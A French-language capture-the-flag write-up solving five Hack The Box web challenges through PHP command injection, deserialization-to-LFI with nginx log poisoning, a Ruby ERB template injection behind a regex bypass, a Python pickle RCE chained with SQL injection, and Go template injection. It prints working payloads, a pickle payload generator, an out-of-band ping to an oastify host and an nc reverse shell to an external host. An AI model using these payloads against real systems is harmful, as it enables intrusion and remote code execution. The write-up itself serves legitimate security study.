# Challenges Web HTB

## LoveTok

La page principale est une URL terminant par "/?format=r" et il semble possible de faire varier ce format, notamment en y mettant des données non-prévues. Cela semble être un point d'entrée pour une injection.

Impossible d'utiliser les caractères suivants à cause de la fonction addslashes() utilisée sur le format dans le code source : 
- '
- "
- \

Impossible d'utiliser de l'encodage puisque la variable $_GET[] va décoder le payload avant de le passer à TimeModel() : 

    $format = isset($_GET['format'])? $_GET['format'] : 'r';
    $time = new TimeModel($format);


Il reste donc l'option des variables complexes : 

    ${system($_GET[commande])}&commande=ls+/
    ${system($_GET[commande])}&commande=cat+/flag

## Toxic 

Dans la page **index.php** on observe que le cookie de session est généré à partir d'un nom de fichier. Ce nom de fichier est sérialisé et combiné avec un calcul : 

    if (empty($_COOKIE['PHPSESSID']))
    {
        $page = new PageModel;
        $page->file = '/www/index.html';

        setcookie(
            'PHPSESSID', 
            base64_encode(serialize($page)), 
            time()+60*60*24, 
            '/'
        );
    } 

En faisant une requête classique on peut récupérer un cookie au format traditionnel : 

>Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9

Le décodage en Base64 de cette valeur donne le résultat suivant : 

    O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}

En remplaçant "**/www/index.html**" par "**/etc/passwd**" puis en réencodant en Base64 on obtient bien le contenu de ce fichier. **Attention à bien mettre à jour le champ "s" qui précède le chemin avec la bonne longueur !**

Exemple de payload en clair : 

    O:9:"PageModel":1:{s:4:"file";s:34:"../../../../../../../../etc/passwd";}

Il faudrait adapter ce payload pour lire le flag directement, mais le nom du flag est généré dynamiquement et n'est pas devinable. On doit donc trouver une RCE.

Le titre du challenge fait directement penser au Log Poisoning et le cas de figure LFI => Log Poisoning => RCE est très connu. Je suis donc parti sur cette voie : 

    O:9:"PageModel":1:{s:4:"file";s:48:"../../../../../../../../var/log/nginx/access.log";}
    
Ce payload encodé en Base64 fonctionne et nous sort les logs du serveur. L'user-agent est bien reflété dedans, on peut donc refaire des requêtes classiques mais cette fois avec les valeurs suivantes dans le header "User-Agent" : 

    <?php system('id'); ?>
    <?php system('ls /'); ?>
    <?php system('cat /flag_K61S1'); ?>

## Neonify 

Le site ne contient qu'une simple page permettant de renvoyer du texte en version fluo. 

Dans le code source de cette page on remarque le morceau suivant : 

    <h1 class="glow"><%= @neon %></h1>
    
Cela ressemble à un point d'entrée pour une SSTI. 

Toutefois, la plupart des payloads classiques de SSTI sont rejetés. En vérifiant le code source du back-end, on observe un filtre par expression régulière : 

    post '/' do
        if params[:neon] =~ /^[0-9a-z ]+$/i
          @neon = ERB.new(params[:neon]).result(binding)
        else
          @neon = "Malicious Input Detected"
        end
        erb :'index'
      end

Utiliser '^' et '$' comme délimiteurs en Ruby est une erreur, puisqu'ils s'arrêtent à la ligne courante et peuvent être contournés par les retours à la ligne.

Voir : https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/

Payload en clair contenant un retour à la ligne et une commande de lecture du flag : 

    ABCDE\n
    <%= File.open('flag.txt').read %>
    
Attention à bien encoder tous les caractères spéciaux et notamment le retour à la ligne.

Payload final : 

    ABCDE%0a
    <%25%3d+File.open('flag.txt').read+%25>

## C.O.P

La cible semble être un simple site marchand avec des références à Pickle.

Dans le fichier **database.py** on voit que le site utilise la fonction **pickle.dumps()** qui peut être vulnérable à des attaques par désérialisation : 

    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))

Dans le fichier **models.py** on voit également une injection SQL classique : 

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

Exemple de script Python pour automatiser la génération du payload : 

    import sys
    import base64
    import pickle
    import urllib.parse
    import requests

    class Payload:
    
      def __reduce__(self):
        import os
        cmd = ("$COMMANDE")
        return os.system, (cmd,)

    if __name__ == "__main__":
      payload = base64.b64encode(pickle.dumps(Payload())).decode()
      payload = f"' UNION SELECT '{payload}' -- "
      payload = requests.utils.requote_uri(payload)
      print(payload)

Suite de payloads à utiliser : 

    ping kvj6lchz2mo961drc3g2duq2ut0kofc4.oastify.com
    mkfifo /tmp/p; nc $NGROK $PORT 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p

## RenderQuest

Le site permet d'injecter des templates à partir d'autres sites.

Le code est en Go et tout est dans le fichier **main.go** 

On trouve une fonction extrêmement intéressante dedans : 

    func (p RequestData) FetchServerInfo(command string) string {
        out, err := exec.Command("sh", "-c", command).Output()
        if err != nil {
            return ""
        }
        return string(out)
    }
    
Quelques utilisations de cette fonction se trouvent plus bas dans le code : 

	reqData.ServerInfo.Hostname = reqData.FetchServerInfo("hostname")
	reqData.ServerInfo.OS = reqData.FetchServerInfo("cat /etc/os-release | grep PRETTY_NAME | cut -d '\"' -f 2")
	reqData.ServerInfo.KernelVersion = reqData.FetchServerInfo("uname -r")
	reqData.ServerInfo.Memory = reqData.FetchServerInfo("free -h | awk '/^Mem/{print $2}'")
    
    
Comme le site utilise des templates, il est sûrement possible d'injecter cette fonction dans un template.


Le site https://webhook.site permet de créer un webhook avec réponses personnalisables.

En mettant **{{.FetchServerInfo "ls"}}** comme réponse dans notre webhook on a bien le retour de la commande lorsque l'on visite la page suivante : 

    http://94.237.54.37:39179/render?use_remote=true&page=https://webhook.site/eefae61c-61f7-424a-9e8c-ce53c112956b

Exemples de payloads à mettre dans les réponses du webhook pour obtenir le flag : 

    {{.FetchServerInfo "ls /"}}
    {{.FetchServerInfo "cat /flag28c66c9c92.txt"}}

Il est important de mettre le point avant la fonction sinon le site plante et retourne une erreur 500.
